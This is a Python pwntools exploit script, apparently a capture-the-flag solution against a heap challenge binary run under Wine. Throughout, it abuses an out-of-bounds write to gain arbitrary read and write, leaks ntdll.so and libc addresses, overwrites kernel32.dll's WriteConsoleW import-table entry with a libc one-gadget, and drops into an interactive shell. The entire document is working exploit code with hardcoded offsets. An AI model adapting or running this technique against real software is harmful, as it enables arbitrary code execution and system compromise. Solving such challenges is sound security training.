from pwn import *
import re

# Constants used for leaking libc
NTDLLDLL_WINE_SYSCALL_DISPATCHER = 0x7bc63030
NTDLLSO_WINE_SYSCALL_DISPATCHER_OFFSET = 0x1ad4c
NTDLLSO_FREE_OFFSET = 0x879d8
LIBCSO_FREE_OFFSET = 0xa53e0

# Constants used for gaining RIP control
KERNEL32DLL_WRITECONSOLEW_IAT = 0x7b6500d4
LIBCSO_ONEGADGET_OFFSET = 0xebd3f

def hex_extract(blob):
    r = ''
    while True:
        m = re.search(rb'[a-f0-9]{8,}', blob)
        if m:
            r += m.group(0).decode()
            blob = blob[m.end():]
        else:
            return r

def allocate(p, size):
    p.sendline(b'1')
    p.recvuntil(b'size?')
    p.sendline(str(size).encode())
    p.recvuntil(b'choice?')

def drop(p, index):
    p.sendline(b'2')
    p.recvuntil(b'index?')
    p.sendline(str(index).encode())
    p.recvuntil(b'choice?')

def read(p, index):
    p.sendline(b'3')
    p.recvuntil(b'index?')
    p.sendline(str(index).encode())
    r = p.recvuntil(b'choice?')
    r = bytes.fromhex(hex_extract(r))
    return r

def write(p, index, data, expect_prompt=True):
    p.sendline(b'4')
    p.recvuntil(b'index?')
    p.sendline(str(index).encode())
    p.recvuntil(b'data?')
    p.sendline(data.hex().encode())
    if expect_prompt:
        p.recvuntil(b'choice?')

def init(p):
    p.recvuntil(b'choice?')
    allocate(p, 0x10)  
    allocate(p, 0x10) 
    allocate(p, 0x10)
    allocate(p, 0x10)
    # The next one will trigger a realloc of the array, which will place it after this buffer
    # The buffer at index 4 will be right before the array.
    # By writing out of bounds of this one, we can overwrite the size and pointer of buffer at index 0.
    allocate(p, 0x10)
    # Place some needles in the buffers to find them easily in a debugger.
    write(p, 0, b'AAAABBBB')
    write(p, 1, b'CCCCDDDD')
    write(p, 2, b'EEEEFFFF')
    write(p, 3, b'GGGGHHHH')
    write(p, 4, b'IIIIJJJJ') 

# By writing out of bounds of buffer at index 4, we can overwrite the pointer
# and size of the buffer at index 0. We can in turn use that to create
# an arbitrary read and write primitive.
def aar(p, address, size):
    payload = b'AAAABBBB' * 6 + p64(size) + p64(address) + p64(size)
    write(p, 4, payload)
    return read(p, 0)

def aaw(p, address, blob):
    # Size doesn't matter since we can write oob
    payload = b'AAAABBBB' * 6 + p64(0x10) + p64(address) + p64(0x10)
    write(p, 4, payload)
    write(p, 0, blob, expect_prompt=False)


p = process(['wine', '/baby-heap-question-mark.exe'])

init(p)

# To leak libc we could:
# * leak a kernel32.dll pointer from the binary's IAT
# * leak a ntdll.dll pointer from kernel32.dll
# * leak a ntdll.so pointer from ntdll.dll
# * leak a libc pointer from ntdll.so
#
# However kernel32.dll and ntdll.dll are not subject to ASLR it seems,
# so we'll start directly from ntdll.dll.
ntdllso_wine_syscall_dispatcher = u64(aar(p, NTDLLDLL_WINE_SYSCALL_DISPATCHER, 8))
print(f"ntdll.so!_WINE_SYSCALL_DISPATCHER: 0x{ntdllso_wine_syscall_dispatcher:x}")
ntdllso = ntdllso_wine_syscall_dispatcher - NTDLLSO_WINE_SYSCALL_DISPATCHER_OFFSET
print(f"ntdll.so: 0x{ntdllso:x}")
ntdllso_free = ntdllso + NTDLLSO_FREE_OFFSET
libcso_free = u64(aar(p, ntdllso_free, 8))
print(f"libc.so!free: 0x{libcso_free:x}")
libcso = libcso_free - LIBCSO_FREE_OFFSET
print(f"libc.so: 0x{libcso:x}")
libcso_onegadget = libcso + LIBCSO_ONEGADGET_OFFSET
print(f"onegadget: 0x{libcso_onegadget:x}")

# For debugging
# input("[*] Attach a debugger? ")

# For some reason the IAT of the binary is not writable.
# Thie IAT of kernel32.dll is writable. WriteConsoleW will be triggered automatically
# (I guess when it is writing the prompt). The registers are also set up correctly for 
# this specific onegadget when it is called the first time after the overwrite.
aaw(p, KERNEL32DLL_WRITECONSOLEW_IAT, p64(libcso_onegadget))

# Enjoy your shell
p.interactive()
